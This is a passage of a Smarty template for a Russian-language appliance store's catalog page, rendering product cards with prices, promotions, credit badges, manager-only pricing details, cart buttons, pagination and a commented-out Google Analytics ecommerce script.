                                 title="{if $item.cat_onename}{$item.cat_onename}{else}{$item.cat}{/if} {$item.brand} {$item.name}"
                                 alt="{if $item.cat_onename}{$item.cat_onename}{else}{$item.cat}{/if} {$item.brand} {$item.name} - catalog"/>
                        </a>
                    {else}
                        <img src="/images/noimage.jpg" alt="{$item.brand} {$item.name}"/>
                    {/if}
                </div>
                {if $item.acttype=='gift'}
                    <div class="gift">
                        <div class="products_container_image_wrap">
                            <a href="#gift-modal-{$item.id}" data-toggle="modal" class="gift-txt-lnk data-getActInfo"
                               id="i_{$item.id}"><img src="/images/catalog/{gift assoc.id=$item.actid}" alt="">
                            </a>
                        </div>
                        <span>Подарок</span>
                    </div>
                {/if}

                {if $item.id_availability == 1}

                    <!-- Credit Logo -->
                    <div class="credit_logo_pp"
                         style="{if $login == 'Гальченко Владимир'}display:none;{/if}position:absolute;margin-top:410px;margin-left:190px">
                        <img src="/images/icons/privatbank_pp_{$item.rent_index}_logo.png" width="60"
                             title="Кредит Оплата Частями Приватбанк" alt="Кредит Оплата Частями Приватбанк">
                    </div>
                    <!-- Credit Logo End -->
                {/if}

                {if $catId == 26 || $catId == 25 || $catId == 209 || $catId == 102 || $catId == 18 || $catId == 24 || $catId == 212 || $catId == 37 || $catId == 314 || $catId == 21 || $catId == 36 || $catId == 322 || $catId == 12 || $catId == 16 || $catId == 88 || $catId == 210 || $catId == 211 || $catId == 175 || $catId == 10 || $catId == 15 || $catId == 155 || $catId == 39 || $catId == 213 || $catId == 11 || $catId == 13 || $catId == 34 || $catId == 302 || $catId == 67}
                    {if $item.acttype !== 'gift' && $item.x_index == '1' || $item.id == '21465'}
                        <div class="zamena-catalog"
                             style="{if $login != 'old version'}display:none;{/if}position:absolute;margin-top:255px;margin-left:105px">
                            <a href="/articles/zamena">
                                <img src="/images/icons/zamena_catalog.png" rel="tooltip"
                                     data-original-title="При покупке техники по системе Trade-in, Вы имеете выгоду в: 1) Весомая скидка на технику; 2) Бесплатная доставка в квартиру; 3) Бесплатное подключение; 4) Вывоз и утилизация старой техники. Все ето, в течении короткого времени мы сделаем сами, тем самым освободив Вас от хлопот и дополнительных финансовых расходов."
                                     alt="zamena">
                            </a>
                        </div>
                    {/if}
                {/if}

                {if $item.acttype=='gift'}
                    <div class="action_terms">
                        <a href="#gift-modal-{$item.id}" data-toggle="modal" class="gift-txt-lnk data-getActInfo"
                           id="i_{$item.id}">Условия акции
                            <img src="/assets/media/akcija.png" alt="акция">
                        </a>
                    </div>
                {else}
                    <div class="action_terms"></div>
                {/if}
                <span class="full_description">{if $zf.params.catid == 189}{$item.short_info|replace:'Стиральная машина':''}{else}{$item.short_info|truncate:270}{/if}</span>
                {if $item.specprice  && ($item.bdprice > $item.price) && (($item.bdprice - $item.price)/$item.price > 0.01) }
                    <span style="font-size: 25px;" class="price_sidebar old">{price $item.bdprice}</span>
                    <span style="font-size: 35px; margin-left: 7px;margin-right: 15%;"
                          class="price_sidebar new priceForEcommerce">{price $item.price $item.id_currency} <span
                                class="currency">{$smarty.session.Currency.title}</span></span>
                {else}
                    <span style="
    float: left;
    font-size: 35px;
    margin-left: 10px;
    color: #0d8abc;
    margin-right: 40%;" class="price_sidebar priceForEcommerce">{price $item.price $item.id_currency}
                        <span class="currency">{$smarty.session.Currency.title}</span>
                            </span>
                {/if}

                <!--{if $item.id_programm==3}<p class="manager-pr">Салонная программа</p>{/if}-->

                {if $manager && $login!="Гальченко Владимир"}
                    {if ($item.price > $item.bestprice) && $item.cost*1.1 < $item.bestprice}
                        <p class="category-price">Первая
                            цена {math equation="(x-y)/x*100" x=$item.price y=$item.bestprice} </p>
                    {/if}
                    {if $item.rent}<p class="category-price">Категория
                        цены {if $item.rent > 25}1{elseif $item.rent > 12.5}2{elseif $item.rent > 7.5}3{else}{/if}</p>{/if}
                    <p class="cat-manager-price">
                        Розница -
                        <span class='strong'>{price $item.roznprice $item.id_currency} {$smarty.session.Currency.title}</span>
                        Скидка - {$item.realDiscount|round}%
                    </p>
                    <p>{$item.qrm}, {$item.qty_z}
                        , {if $item.rqrm}{$item.rqrm}{else}-{/if}{if $login == 'Сергей Гринюк' || $login == 'Vadyus' || $login == 'Vitaliy Shyshko'}{if $item.rent},({$item.rent|round}){/if},[{$item.sold}]{/if}</p>
                {/if}
                {literal}
                    <style type="text/css">
                        .btn:hover {
                            background-position: 0 -30px !important;
                        }
                    </style>
                {/literal}
                <span class="cat-item-buy">
                            {if !in_array($item.id, $basketStats.ids)}
                                <a style="
    float: left;
    margin-top: 10px;
        margin-left: -11px;
    background-image: linear-gradient(to bottom, #5bde71, #2ba247);
    background-color: #5bde71;" href="#data-basket" data-productErommerceId="{$item.id}" onclick="addToCart({$item.id})"
                                   data-toggle="modal" class="btn btn-info data-AddToCart data-itemId-{$item.id}">
                                    <i class="icon-shopping-cart icon-white"></i>
                                    <span>{if $item.id_availability == 1}Купить{else}Заказать{/if}</span>
                                </a>




{else}





                                <a style="
    float: left;
    margin-top: 10px;
    margin-left: -11px;
    background-image: linear-gradient(to bottom, #f7a81e, #f89406);
    background-color: #f7a81e;" href="#data-basket" data-productErommerceId="{$item.id}" onclick="addToCart({$item.id})"
                                   data-toggle="modal" class="btn btn-warning data-AddToCart data-itemId-{$item.id}">
                                    <i class="icon-shopping-cart icon-white"></i>
                                    <span>В корзине</span>
                                </a>
                            {/if}
                        </span>
                <p class="cat-item-compare">
                            <span title="Добавить в список сравнения" id="comp_{$item.id}" data-id='{$item.id}'
                                  data-category='{$item.cat|mblower}'
                                  class="data-toggleCompare{if in_array($item.id, $compareItems)} checked{/if}"
                                  data-url="{$url.img}/catalog/{$item.imgid}_s.{$item.imgext}">
                                <!--<i>в список сравнения</i>-->
                            </span>
                </p>

                {if $item.id_availability == 1}
                {literal}
                    <div style="{/literal}{if $login == 'Гальченко Владимир'}display:none;{/if}{literal}
                        color: #40bc59;
                        font-weight: 900;
                        float: left;
                        margin-left: 51px;
                        line-height: 14px;
                        font-size: 12px;
                        text-align: center;
                        margin-top: -25px;
                        ">от {/literal}{$item.price/$item.rent_index*$curs_evro_smarty|round}{literal}
                    <br>
                    грн./мес</div>
                {/literal} {/if}
                {if $item.id_brand == '26' && $item.id_category != 60 && $login == 'old version'}
                    <i class="guarantee-icon"></i>
                {/if}

                <!-- / .cat-item1 --></div>
            {assign var="number_of_element" value=$number_of_element+1}
            {/foreach}
            <!-- / .products --></div>

        <div class="clear"></div>

        {if $pages->pageCount > 1}
            <!-- Pager -->
            <div class="span-12 no_margin category_nav paggination">
                <p>Страницы:</p>
                {if $pages->current > 1}
                    <a href="{if $pages->current-1=='1'}{$firstPageUrl}{else}{$firstPageUrl}/page/{$pages->current-1}{/if}">&larr;</a>
                {/if}
                {if $pages->firstPageInRangeNum!=1}
                    <a href="{$firstPageUrl}">1</a>
                    <p>...</p>
                {/if}
                {if $pages->pagesInRange}
                    {foreach from=$pages->pagesInRange item=p key=k}
                        {if $pages->current!=$k}
                            <a href="{if $k=='1'}{$firstPageUrl}{else}{$firstPageUrl}/page/{$k}{/if}">{$k}</a>
                        {else}
                            <span class="current">{$pages->current}</span>
                        {/if}
                    {/foreach}
                {/if}
                {if $pages->pageCount && $pages->lastPageInRange != $pages->last}
                    <p>...</p>
                    <a href="{$firstPageUrl}/page/{$pages->pageCount}">{$pages->pageCount}</a>
                {/if}

                {if $pages->current < $pages->pageCount}
                    <a href="{$firstPageUrl}/page/{$pages->current+1}">&rarr;</a>
                {/if}
            </div>
            <!-- Pager End -->
        {/if}

        {else}
        <div class="alert alert-error">По заданным параметрам ничего не найдено<br/>
            <a class="btn btn-mini" href="{$baseUrl}"><i class="icon-arrow-left"></i> вернуться назад</a>
        </div>
        {/if}
        {else}
        {if $catId!=1}
            <!--Categories-->
            {include file='catalog/categories.tpl'}
            <!--Categories-->
        {else}
            <!--Categories CAT=1-->
            {include file='catalog/categories-1.tpl'}
            <!--Categories CAT=1-->
        {/if}
        {/if}

        <!--{literal}
                                <script>
                                    // Вызывается, когда пользователь кликает по продукту
                                    function onProductClickEcommerce(id) {
                                        ga('create', 'UA-46008870-1'); //ID аккаунта в Google Analytics
                                        ga('require', 'ec');
                                        console.log(productForEcommerce[id]);
                                        ga('ec:addProduct', {
                                            'id': productForEcommerce[id].id,
                                            'name': productForEcommerce[id].name,
                                            'category': productForEcommerce[id].category,
                                            'position': productForEcommerce[id].position,
                                        });
                                        ga('ec:setAction', 'click', {list: productForEcommerce[id].list});
                                        // Клик по продукту и перенаправление пользователя на страницу товара
                                        ga('send', 'event', 'UX', 'click', 'Results');
                                    }
                                    function addToCartEcommerce(id) {
                                        console.log(productForEcommerce[id]);
                                        ga('ec:addProduct', {
                                            'id': productForEcommerce[id].id,
                                            'name': productForEcommerce[id].name,
                                            'category': productForEcommerce[id].category,
                                            'position': productForEcommerce[id].position,
                                            'price': productForEcommerce[id].price
                                        });
                                        ga('ec:setAction', 'add', {list: productForEcommerce[id].category});
                                        ga('send', 'event', 'UX', 'click', 'add to cart'); // Отправка данных
                                    }
                                    $('a.btn-info').click(function(){
                                        if($(this).data('producterommerceid'))
                                            addToCartEcommerce($(this).data('producterommerceid'));
                                    });
                                </script>
                            {/literal}-->

        {else}
        {include file='error/404.tpl'}
        {/if}

{include file='layouts/_footer.tpl'}